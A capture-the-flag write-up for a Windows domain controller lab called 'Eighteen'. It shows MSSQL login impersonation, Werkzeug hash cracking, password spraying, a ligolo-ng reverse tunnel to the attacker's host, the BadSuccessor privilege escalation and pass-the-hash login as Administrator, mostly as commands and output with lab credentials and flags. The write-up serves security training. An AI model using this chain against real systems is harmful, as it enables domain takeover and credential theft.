
# CTF Writeup: Eighteen

---

We get the following credentials to access the server itself.

```
kevin:iNa2we6haRj2gaw!
```
## Reconnaissance

An initial scan revealed the following information about running services on the target server.

```
nmap -p- 10.129.15.94 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-12 09:57 -0500
Stats: 0:01:37 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 75.71% done; ETC: 09:59 (0:00:31 remaining)
Nmap scan report for 10.129.15.94
Host is up (0.038s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
1433/tcp open  ms-sql-s
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 121.65 seconds
```

An more detailled scan revealed information about running services on the target system.

```
nmap -sCV -p 80,1433,5985 10.129.15.94
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-12 10:01 -0500
Nmap scan report for 10.129.15.94
Host is up (0.031s latency).

PORT     STATE SERVICE  VERSION
80/tcp   open  http     Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to http://eighteen.htb/
1433/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   10.129.15.94:1433: 
|     Target_Name: EIGHTEEN
|     NetBIOS_Domain_Name: EIGHTEEN
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: eighteen.htb
|     DNS_Computer_Name: DC01.eighteen.htb
|     DNS_Tree_Name: eighteen.htb
|_    Product_Version: 10.0.26100
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-06-12T21:56:23
|_Not valid after:  2056-06-12T21:56:23
|_ssl-date: 2026-06-12T22:01:39+00:00; +7h00m00s from scanner time.
| ms-sql-info: 
|   10.129.15.94:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 6h59m59s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.28 seconds
```

The nmap scan reveals that the website is trying to redirect us to an domain called "eighteen.htb" but fails, let's map the target ip address to the domain in our local dns file /etc/hosts.

```
echo "10.129.15.94 eighteen.htb" | tee -a /etc/hosts
```

Upon accessing the webpage we see an login panel.

Judging from the nmap scan we can see the name of the DC "DC01.eighteen.htb", let's map it to the target ip address aswell!

```
nano /etc/hosts
```

I saw that I can login locally onto mssql database of the domain controller.

```
nxc mssql eighteen.htb -u 'kevin' -p 'iNa2we6haRj2gaw!' --local-auth
MSSQL       10.129.15.94    1433   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:eighteen.htb) (EncryptionReq:False)
MSSQL       10.129.15.94    1433   DC01             [+] DC01\kevin:iNa2we6haRj2gaw!
```

Since I am able to authenticate against the mssql database as an local user. I will connect to it locally.

```
impacket-mssqlclient kevin:'iNa2we6haRj2gaw!'@eighteen.htb
```

Enumerated Databases

```
SQL (kevin  guest@master)> SELECT name FROM sys.databases;
name                                                                                                                                                                                                                                        
-----------------                                                                                                                                                                                                                           
master                                                                                                                                                                                                                                      
tempdb                                                                                                                                                                                                                                      
model                                                                                                                                                                                                                                       
msdb                                                                                                                                                                                                                                        
financial_planner
```

There seems to be an non-default database "financial_planner".

I tried to access and enumerate this database, but our current user "kevin" seems to be missing privs.

```
SQL (kevin  guest@master)> SELECT * FROM financial_planner.information_schema.tables;
ERROR(DC01): Line 1: The server principal "kevin" is not able to access the database "financial_planner" under the current security context.
```

Since the box itself hinted at the MSSQL Service, I will check if my current user can impersonate an high priv user.

```
nxc mssql eighteen.htb -u kevin -p 'iNa2we6haRj2gaw!' -M enum_impersonate --local-auth
MSSQL       10.129.15.94    1433   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:eighteen.htb) (EncryptionReq:False)
MSSQL       10.129.15.94    1433   DC01             [+] DC01\kevin:iNa2we6haRj2gaw! 
ENUM_IMP... 10.129.15.94    1433   DC01             [+] Users with impersonation rights:
ENUM_IMP... 10.129.15.94    1433   DC01             [*]   - appdev
```

Apparently we can impersonate the privileges of an high priv user called "appdev" in the MSSQL Database. Let's do it!

```
SQL (kevin  guest@master)> EXECUTE AS LOGIN = 'appdev'
SQL (appdev  appdev@master)>
```

We should now be able to enumerate the database.

I proceeded with enumerating all available tables within the database.

```
SQL (appdev  appdev@master)> SELECT * FROM financial_planner.information_schema.tables;
TABLE_CATALOG       TABLE_SCHEMA   TABLE_NAME    TABLE_TYPE   
-----------------   ------------   -----------   ----------   
financial_planner   dbo            users         b'BASE TABLE'   
financial_planner   dbo            incomes       b'BASE TABLE'   
financial_planner   dbo            expenses      b'BASE TABLE'   
financial_planner   dbo            allocations   b'BASE TABLE'   
financial_planner   dbo            analytics     b'BASE TABLE'   
financial_planner   dbo            visits        b'BASE TABLE'
```

The users table seems interesting, let's enumerate it. It revealed admin credentials with an encoded password.

```
admin:pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133
```

Since the hash stored in the database provides us with the information "pbkdf2:sha256:600000" we know that this is an flask/werkzeug generated hash.
I utilized an script I found online to properly prepare the hash for bruteforcing.

The Script:

```
import base64
import codecs
import re
import sys


if len(sys.argv) != 2:
    print(f'usage: {sys.argv[0]} <werkzeug hash file>')
    print('Input file has Werkzeug hashes one per line')
    sys.exit(1)

with open(sys.argv[1], 'r') as f:
    hashes = f.readlines()

for h in hashes:
    m = re.match(r'pbkdf2:sha256:(\d*)\$([^\$]*)\$(.*)', h)
    iterations =  m.group(1)
    salt = m.group(2)
    hashe = m.group(3)
    print(f"sha256:{iterations}:{base64.b64encode(salt.encode()).decode()}:{base64.b64encode(codecs.decode(hashe,'hex')).decode()}")
```

I ran the following command and stored the prepared hash in an "admin.hash" file.
```
python3 werkzeug_to_hashcat.py <( echo 'pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133' ) | tee admin.hash
```

Bruteforced an passphrase with hashcat.

```
hashcat admin.hash /usr/share/wordlists/rockyou.txt
```

We now got valid credentials, let's access the login panel.

```
admin:iloveyou1
```

It seems that there isn't anything interesting in the panel itself. Let's try & use our credentials to enum users.

```
nxc mssql eighteen.htb -u kevin -p 'iNa2we6haRj2gaw!' --rid-brute --local-auth
```

Sprayed usernames and found valid domain credentials for user "adam.scott".

```
nxc winrm eighteen.htb -u newusers.txt -p 'iloveyou1'
WINRM       10.129.15.94    5985   DC01             [+] eighteen.htb\adam.scott:iloveyou1 (Pwn3d!)

```

Connected to the DC as user "adam.scott" via evil-winrm

```
evil-winrm -i eighteen.htb -u adam.scott -p iloveyou1                   
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                            
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\adam.scott\Documents>
```

Retrieved user.txt in C:\Users\adam.scott\Desktop

```
7cbac63497bac180a4b25b279176513c
```

## Privilege Escalation

I ran WinPEAS and tried some manual enum but couldn't find anything interesting. Since we now got a pair of domain credentials, let's utilize them in order to download domain information.

I wasn't able to use bloodhound-python, since I wasn't able to request an TGT. So I decided to utilize SharpHound instead. Downloaded it onto target system and ran it within the evil-winrm session.

```
./SharpHound.exe
```

Our current user seems to be part of an non-default group named "IT", observing the group we see that it has perms on "Staff" OU. The Server itself is Windows Server 2025 which could be vulnerable to Bad Successor Exploit.

1. Download the .ps1 script from Akamai onto the target system and run it.

```
.\Get-BadSuccessorOUPermissions.ps1

Identity    OUs
--------    ---
EIGHTEEN\IT {OU=Staff,DC=eighteen,DC=htb}
```

It revealed which groups have rights for any OU.

2. Check if the current user is part of the group

```
whoami /groups
```

If he is part of the Group "IT" we can abuse it!

The next step is to port forward using ligolo-ng.

4. Upload ligolo-ng binary onto target system.

```
upload agent.exe
```

5. Start up ligolo ng proxy on local machine

```
ip tuntap add user saitama mode tun ligolo && ip link set ligolo up && ligolo-proxy -selfcert
```

6. Call reverse connection to proxy from target system.

```
./agent -connect 10.10.15.9:11601 -ignore-cert
```

7. Start tunneling

```
start --tun ligolo
```

7. Add Route to "magic IP"

```
ip route add 240.0.0.1/32 dev ligolo
```

8. Check if BadSuccessor works using nxc

```
nxc ldap 240.0.0.1 -u adam.scott -p iloveyou1 -M badsuccessor
LDAP        240.0.0.1       389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:eighteen.htb) (signing:Enforced) (channel binding:No TLS cert)
LDAP        240.0.0.1       389    DC01             [+] eighteen.htb\adam.scott:iloveyou1 
BADSUCCE... 240.0.0.1       389    DC01             [+] Found domain controller with operating system Windows Server 2025: 10.129.17.132 (DC01.eighteen.htb)
BADSUCCE... 240.0.0.1       389    DC01             [+] Found 1 results
BADSUCCE... 240.0.0.1       389    DC01             IT (S-1-5-21-1152179935-589108180-1989892463-1604), OU=Staff,DC=eighteen,DC=htb
```

9. Download "uv" tool.

```
curl --proto '=https' --tlsv1.2 -LsSf https://releases.astral.sh/github/uv/releases/download/0.11.21/uv-installer.sh | sh
```

10. Adjust date/time for DC

```
sudo systemctl restart systemd-timesyncd.service ; sudo timedatectl set-ntp no ; sudo ntpdate -u 240.0.0.1
```

11. Install Custom nxc fork with bad successor

```
uv tool install git+https://github.com/azoxlpf/NetExec.git@feat/refactor-badsuccessor
```

12. Run the badsuccessor module in nxc

I used the nxc version which got installed/forked with "uv" not my normal nxc binary.

```
/root/.local/share/uv/tools/netexec/bin/nxc ldap 240.0.0.1 -u 'adam.scott' -p 'iloveyou1' -M badsuccessor --options
```

13. Run the command

```
/root/.local/share/uv/tools/netexec/bin/nxc ldap 240.0.0.1 -u adam.scott -p iloveyou1 -M badsuccessor -o TARGET_OU='OU=Staff,DC=eighteen,DC=htb'
```

This now conducted the attack and created at an DNS Hostname and requested the TGT of the Administrator User and provided us with his NTLM Hash.

14. Login As Administrator

```
impacket-psexec Administrator@240.0.0.1 -hashes 8f81922120a7a37264098b8b5b607cdf:0b133be956bfaddf9cea56701affddec
```

Retrieved root.txt in C:\Users\Administrator\Desktop

```
1c73dd842a219299c29c9650d4dccc73
```